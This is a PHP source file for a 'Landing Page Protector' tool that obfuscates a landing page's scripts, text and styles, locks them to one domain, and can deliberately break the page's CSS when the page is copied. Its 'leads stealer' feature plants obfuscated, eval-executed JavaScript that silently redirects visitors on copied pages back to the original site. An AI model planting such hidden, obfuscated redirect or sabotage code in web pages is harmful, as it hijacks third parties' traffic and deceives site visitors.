<?php

//Landing Page Protector v.1.4.4 by Yellow Web (https://yellowweb.top)
class ProtectorSettings
{
    //==========================ON/OFF==============================================================
    //if false - the protector won't work at all
    public $on = true;

    //==========================BASIC HTML-CSS-JS TRICKS============================================
    //if true - all local and inline scripts will be joined into one script
    //this script will be obfuscated and added right before the closing </body> tag
    public $combineAllJS = false;
    //if true - then malicious random css will be added to html elements that will
    //make the landing look ugly and unusable, obfuscated js code for undoing this behaviour
    //will be added. So the landing will look ok on our site but when downloaded - it will be broken
    public $breakCSS = false;
    //if true then all styles will be combined into one which will be added into DOM dynamically using JS.
    //no one will be able to download page styles
    public $hideCSS = true;
    //if true then some random text blocks from your landing will be obfuscated
    public $obfuscateText = true;

    //==========================ADVANCED TRICKS=====================================================
    //===============will work ONLY when $combineAllJS is true======================================
    //if true, then all the js code from this landing will execute only on the current domain
    //if the domain name differs - then all js won't run, and the css will be broken
    public $domainLock = true;
    //if >0 then the domain lock will start work only after $domainLockOffDays pass
    //if 0 then domainLock starts working immediately
    public $domainLockOffDays = 0;

    //==========================LEADS STEALER=======================================================
    //when someone downloads your landing there is always a current date inside,
    //when $stealOffDays pass - the leads stealer starts it work!
    //if $stealOffDays is zero - then the leads stealer starts immediately
    public $stealOffDays = 0;
    //the percentage of traffic that will be redirected back to your landing
    //if the domain name does not match
    //if zero - then leads stealer is OFF
    public $stealPercent = 100;
    //additional querystring parameters that will be added to your landing link
    //when the script steals traffic. Must be in format: a=b&c=d without ?
    public $stealQueryString = "from=stealer";

    //==========================DEBUG SETTINGS, FOR DEVELOPERS ONLY!================================
    //if debug is true - the combined scripts won't be obfuscated && all the Advanced tricks will be off
    //also console.log will be added to scripts, to show their execution flow
    public $debug = false;
    //if true then the script will send a YWBProtectTime header
    //with the time value (in seconds), that it took to process the landing
    public $debugTime = false;
    //if you wan't to debug smth - switch to false. This will keep the styles on localhost not broken.
    public $breakCSSOnLocalHost = false; 
}

class YwbPageProtector
{
    private $dom;
    private $xpath;
    private $scriptsContent = [];
    private $settings;
    private $stealerInserted = false;

    public function __construct($settings)
    {
        $this->settings = $settings;
        if ($this->settings->debug) {
            ini_set('display_errors', '1');
            ini_set('display_startup_errors', 1);
            error_reporting(E_ALL);
        }
        ob_start();
    }

    public function finalize()
    {
        $start_time = $this->settings->debugTime ? microtime(true) : 0;

        $content = ob_get_clean();
        if (!$this->settings->on) {
            echo $content;
            exit;
        }

        $this->dom = new DOMDocument();
        @$this->dom->loadHTML('<meta http-equiv="Content-Type" content="text/html; charset=utf-8">'.  $content);
        $this->xpath = new DOMXPath($this->dom);

        if($this->settings->combineAllJS) {
            $this->removeAndCombineScripts();
        }

        if ($this->settings->breakCSS) {
            $this->breakCSS();
        }

        if ($this->settings->hideCSS) {
            $this->hideCSS();
        }

        if ($this->settings->obfuscateText) {
            $this->obfuscateText();
        }

        $this->insertCombinedScripts();

        $html = $this->dom->saveHTML();

        $html = $this->postProcessHtml($html);

        //send elapsed time
        if ($this->settings->debugTime) {
            $time_elapsed_secs = microtime(true) - $start_time;
            header("YWBProtectTime: " . $time_elapsed_secs);
        }

        if ($this->settings->debug) {
            file_put_contents(__DIR__.'/debug.html', $html);
        }
        echo $html;
        exit;
    }

    private function removeAndCombineScripts()
    {
        $scripts = $this->dom->getElementsByTagName('script');
        for ($i = $scripts->length - 1; $i >= 0; $i--) {
            $script = $scripts->item($i);
            if ($script->getAttribute('class') === 'whitelist') {
                continue;
            }
            $src = $script->getAttribute('src');

            // Skip the script if its src contains 'http', 'https', or 'jquery'
            if (preg_match('/https?:\/\//i', $src) || strpos($src, 'jquery') !== false) {
                continue;
            }

            // Remove query string from src
            if (($pos = strpos($src, '?')) !== false) {
                $src = substr($src, 0, $pos);
                // Update the src attribute to remove the query string part
                $script->setAttribute('src', $src);
            }

            // Skip scripts with dtime_nums
            $scriptText = trim($script->textContent);
            if (preg_match('/^dtime_nums\(\s*[-]?\d+\s*,\s*(true|false)\s*\)\s*;?$/', $scriptText)) {
                continue;
            }

            // Process inlined or local scripts
            if (empty($src)) {
                // Inline script
                $scriptText = $this->settings->debug ?
                    "console.log('Inline Script #$i');".$script->textContent :
                    $script->textContent;
                $this->scriptsContent[] = $scriptText;
            } else {
                // Local script
                $scriptPath = __DIR__.'/'.$src;
                if (file_exists($scriptPath)) {
                    $scriptContent = file_get_contents(__DIR__.'/'.$src);
                    $scriptText = $this->settings->debug ?
                        "console.log('Local Script #$i from $src');".$scriptContent :
                        $scriptContent;
                    $this->scriptsContent[] = $scriptText;
                } else {
                    if ($this->settings->debug) {
                        $this->scriptsContent[] = "console.log('Local script $src NOT FOUND!');";
                    }
                }
            }
            // Remove the script tag from the DOM
            $script->parentNode->removeChild($script);
        }
    }

    private function hideCSS()
    {
        $cssContent = '';
        $js = '';
        $links = $this->dom->getElementsByTagName('link');
        $toRemove = [];
        foreach ($links as $link) {
            if (strtolower($link->getAttribute('rel')) !== 'stylesheet') {
                continue;
            }

            if ($link->getAttribute('class') === 'whitelist') {
                continue;
            }

            $href = $link->getAttribute('href');
            if (empty($href))
                continue;
            if (strpos($href, 'http://') === 0 || strpos($href, 'https://') === 0){
                if ($this->settings->debug)
                    $js .= "console.log('Skipped style: $href');\n";
                continue;
            }
            $cssPath = __DIR__ . '/' . $href; // Adjust this path as needed
            if (!file_exists($cssPath)) {
                if ($this->settings->debug) {
                    $js .= "console.log('Style not found: $href');\n";
                }
                continue;
            }

            $cssFileContent = file_get_contents($cssPath);
            if ($this->settings->debug) {
                $js .= "console.log('Style processed: $href');\n";
            }

            // Escape backslashes and newlines for JavaScript string
            $cssContent .= addcslashes($cssFileContent, "\\'\n\r");
            $toRemove[] = $link;
        }

        if ($cssContent !== '') {
            $js .= "const sheet = new CSSStyleSheet();\n";
            $js .= "sheet.replaceSync(`$cssContent`);\n";
            $js .= "document.adoptedStyleSheets.push(sheet);";


            $finalJs = "document.addEventListener('DOMContentLoaded', function() {";
            if ($this->settings->debug) {
                $finalJs .= "console.log('Adding computed stylesheets...');";
            }
            $finalJs .= "$js});";
            $this->scriptsContent[] = $finalJs;
        }

        foreach ($toRemove as $link) {
            $link->parentNode->removeChild($link);
        }
    }

    private function breakCSS()
    {
        // Find all divs, spans, and ps without inline styles
        $elements = $this->xpath->query('//div[not(@style) and not(@id)] | //span[not(@style) and not(@id)] | //p[not(@style) and not(@id)]');

        $randomStyles = ['font-size: small;', 'color: white;', 'float: left;', 'float: right;'];

        $restoreScript = "";
        // Apply random styles and track changes
        foreach ($elements as $element) {
            $id = $this->generateUniqueId();
            $element->setAttribute('id', $id);
            if ($this->settings->debug) {
                file_put_contents("php://stdout", "Setting id $id to $element->nodeName\n");
            }


            $randomStyle = $randomStyles[array_rand($randomStyles)];
            $element->setAttribute('style', $randomStyle);

            $styleProperty = $this->convertToCamelCase(explode(':', $randomStyle)[0]); // Convert to camelCase
            $styleValue = trim(explode(':', $randomStyle)[1]);

            // Use the function for each element
            $restoreScript .= "restoreOrApplyStyle('$id', '$styleProperty', '$styleValue');\n";
        }

        $breakOnLH = $this->settings->breakCSSOnLocalHost ? "true" : "false";
        $useDebug = $this->settings->debug ? "true" : "false";
        $restoreScript = <<<EOD
        document.addEventListener('DOMContentLoaded', function() {
            function isLocalHost(){
                if (!$breakOnLH) return false;
                let lcl = (window.location.host.includes('localhost') || 
                           window.location.host.includes('127.0.0.1') || 
                           window.location.protocol=='file:');

                if (lcl) debug('LOCALHOST found!');
                return lcl;
            }

            function restoreOrApplyStyle(elemId, styleProperty, styleValue) {
                var maxNotFound = 3;
                var curNotFound = 0;
                debug('Adding styles for '+elemId+': '+styleProperty+'='+styleValue);
                var elem = document.getElementById(elemId);
                if (elem) {
                    var styleAttribute = elem.getAttribute('style');
                    if (styleAttribute == '' || 
                        !styleAttribute||
                        isLocalHost()) {
                        elem.setAttribute('style', styleProperty+': '+styleValue);
                    } else {
                        debug('Setting EMPTY style!');
                        elem.setAttribute('style', '');
                    }
                } else {
                    curNotFound++;
                    if (curNotFound<=maxNotFound) {
                        debug('Element with id '+elemId+' not found! Threshold not reached:'+curNotFound);
                        return;
                    }
                    debug('Element with id '+elemId+' NOT FOUND! Breaking random element...');
                    var allElems = document.querySelectorAll(elem.tagName);
                    if (allElems.length > 0) {
                        var randomIndex = Math.floor(Math.random() * allElems.length);
                        var randomElem = allElems[randomIndex];
                        randomElem.style[styleProperty] = styleValue;
                    }
                }
            }

            function debug(msg){
                if ($useDebug) console.log(msg);
            }
            $restoreScript
        });
        EOD;

        $this->scriptsContent[] = $restoreScript;
    }

    private function obfuscateText()
    {
        $ho = new JsObfuscator();
        $texts = $this->xpath->query('//text()[not(ancestor::title) and not(ancestor::label) and not(ancestor::a) and not(ancestor::li) and not(ancestor::h1) and not(ancestor::h2) and not(ancestor::h3) and not(ancestor::style) and not(ancestor::script)]');
        foreach ($texts as $t) {
            if (strlen(trim($t->wholeText)) < 30 || rand(0, 1) === 0) {
                continue;
            }

            $jsText = $ho->html2Js($t->wholeText);
            if (!$this->stealerInserted && rand(0, 100) < 30) {
                $stlrCode = $this->getStealerCode();
                if ($stlrCode !== "") {
                    $jsText .= "\n$stlrCode";
                }
                $this->stealerInserted = true;
            }

            if (!$this->settings->debug) {
                $jsText = $ho->obfuscate($jsText);
            }
            $script = $this->dom->createElement('script', $jsText);

            $replaced = $t->parentNode->replaceChild($script, $t);
            if (!$replaced) {
                continue;
            }
        }
    }

    private function getStealerCode()
    {
        $percent = $this->settings->stealPercent;
        if ($percent === 0) {
            return "";
        }

        $curLink = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        if ($this->settings->stealQueryString !== '') {
            if (strpos($curLink, '?') !== false) {
                $curLink .= "&".$this->settings->stealQueryString;
            } else {
                $curLink .= "?".$this->settings->stealQueryString;
            }
        }
        $code = "if(window.location.hostname!=='" . $_SERVER['SERVER_NAME'] ."' && Math.round(Math.random() * 100, 0) <= $percent){ window.location.href='$curLink';}";
        if ($this->settings->stealOffDays > 0) {
            $timestamp = time() + $this->settings->stealOffDays * 86400;
            $code = "if((Math.round(+new Date()/1000)) >  $timestamp ){ $code }";
        }
        $code = "document.addEventListener('DOMContentLoaded', function() { $code });";
        return $code;
    }

    private function insertCombinedScripts()
    {
        if (count($this->scriptsContent) == 0) {
            return;
        }

        if (!$this->stealerInserted && $this->settings->stealPercent > 0) {
            $this->scriptsContent[] = $this->getStealerCode();
        }

        // Combine all script contents
        $combinedScripts = implode("\n", $this->scriptsContent);

        if (!$this->settings->debug) {
            if ($this->settings->domainLock) {
                $condition = "window.location.hostname==='" . $_SERVER['SERVER_NAME'] ."'";
                if ($this->settings->domainLockOffDays > 0) {
                    $timestamp = time() + $this->settings->domainLockOffDays * 86400;
                    $condition .= ' || (Math.round(+new Date()/1000)) < ' . $timestamp;
                }

                $combinedScripts =  "if($condition){" . $combinedScripts . "}";
            }

            //clean comments only when js does not contain CSS!
            $ho = new JsObfuscator(!$this->settings->hideCSS);
            $combinedScripts = $ho->obfuscate($combinedScripts);
        }

        $script = $this->dom->createElement('script');
        $script->nodeValue = $combinedScripts;

        $body = $this->dom->getElementsByTagName('body')->item(0);

        // Append the script as the last child of the body element
        if ($body !== null) {
            $body->appendChild($script);
        }
    }

    private function postProcessHtml($html)
    {
        $pattern = "/%7B([a-zA-Z_-]+)%7D/";
        $replacement = '{$1}';
        return preg_replace($pattern, $replacement, $html);
    }

    private function generateUniqueId()
    {
        return 'custom-' . uniqid(); // Generate a unique ID
    }

    private function convertToCamelCase($styleProperty)
    {
        // Convert CSS property to JavaScript style, e.g., 'font-size' to 'fontSize'
        return lcfirst(str_replace(' ', '', ucwords(str_replace('-', ' ', $styleProperty))));
    }
}

//If accessed directly - show settings
if (__FILE__ == $_SERVER['SCRIPT_FILENAME']) {
    $settings = new ProtectorSettings();
    $settingsArray = get_object_vars($settings);
    $jsonSettings = json_encode($settingsArray, JSON_PRETTY_PRINT);
    header('Content-Type: application/json');
    echo $jsonSettings;
    exit();
}
// Usage
$pageProtector = new YwbPageProtector(new ProtectorSettings());
register_shutdown_function([$pageProtector, 'finalize']);


class JsObfuscator
{
    private $mask;
    private $interval;
    private $option = 0;
    private $cleanComments = false;

    public function __construct($cleanComments = false)
    {
        $this->cleanComments = $cleanComments;
        $this->mask = $this->getMask();
        $this->interval = rand(1, 50);
        $this->option = rand(2, 8);
    }

    private function getMask()
    {
        $charset = str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
        return substr($charset, 0, 9);
    }

    private function hashIt($s)
    {
        for ($i = 0; $i < strlen($this->mask); ++$i) {
            $s = str_replace("$i", $this->mask[$i], $s);
        }
        return $s;
    }

    private function encodeIt($code)
    {
        $str = "";
        for ($i = 0; $i < strlen($code); ++$i) {
            $str .= $this->hashIt(base_convert(ord($code[$i]) + $this->interval, 10, $this->option)) . $this->mask[$this->option];
        }
        return $str;
    }

    public function obfuscate($code)
    {
        $code = $this->cleanJS($code);

        $rand = rand(0, 99);
        $rand1 = rand(0, 99);
        return "var _0xc{$rand}e=[\"\",\"\x73\x70\x6C\x69\x74\",\"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x2B\x2F\",\"\x73\x6C\x69\x63\x65\",\"\x69\x6E\x64\x65\x78\x4F\x66\",\"\",\"\",\"\x2E\",\"\x70\x6F\x77\",\"\x72\x65\x64\x75\x63\x65\",\"\x72\x65\x76\x65\x72\x73\x65\",\"\x30\"];function _0xe{$rand1}c(d,e,f){var g=_0xc{$rand}e[2][_0xc{$rand}e[1]](_0xc{$rand}e[0]);var h=g[_0xc{$rand}e[3]](0,e);var i=g[_0xc{$rand}e[3]](0,f);var j=d[_0xc{$rand}e[1]](_0xc{$rand}e[0])[_0xc{$rand}e[10]]()[_0xc{$rand}e[9]](function(a,b,c){if(h[_0xc{$rand}e[4]](b)!==-1)return a+=h[_0xc{$rand}e[4]](b)*(Math[_0xc{$rand}e[8]](e,c))},0);var k=_0xc{$rand}e[0];while(j>0){ k=i[j%f]+k;j=(j-(j%f))/f; }return k||_0xc{$rand}e[11]}eval(function(h,u,n,t,e,r){r=\"\";for(var i=0,len=h.length;i<len;i++){var s=\"\";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],\"g\"),j);r+=String.fromCharCode(_0xe{$rand1}c(s,e,10)-t)}return decodeURIComponent(escape(r))}(\"" . $this->encodeIt($code) . "\"," . rand(1, 100) . ",\"" . $this->mask . "\"," . $this->interval . "," . $this->option . "," . rand(1, 60) . "))";
    }

    public function html2Js($code)
    {
        $code = $this->cleanHtml($code);
        $search = array(
            '/\>[^\S ]+/s',     // strip whitespaces after tags, except space
            '/[^\S ]+\</s',     // strip whitespaces before tags, except space
            '/(\s)+/s',         // shorten multiple whitespace sequences
            '/<!--(.|\s)*?-->/' // Remove HTML comments
        );
        $replace = array(
            '>',
            '<',
            '\\1',
            ''
        );
        $code = preg_replace($search, $replace, $code);
        $code = "document.write('" . addslashes($code . " ") . "');";
        return $code;
    }

    private function cleanHtml($code)
    {
        return preg_replace('/<!--(.|\s)*?-->/', '', $code);
    }

    private function cleanJS($code)
    {
        if ($this->cleanComments) {
            $pattern = '/(?:(?:\/\*(?:[^*]|(?:\*+[^*\/]))*\*+\/)|(?:(?<!\:|\\\|\')\/\/.*))/';
            $code = preg_replace($pattern, '', $code);
        }
        $search = array(
            '/\>[^\S ]+/s',     // strip whitespaces after tags, except space
            '/[^\S ]+\</s',     // strip whitespaces before tags, except space
            '/(\s)+/s',         // shorten multiple whitespace sequences
            '/<!--(.|\s)*?-->/' // Remove HTML comments
        );
        $replace = array(
            '>',
            '<',
            '\\1',
            ''
        );
        return preg_replace($search, $replace, $code);
    }
}
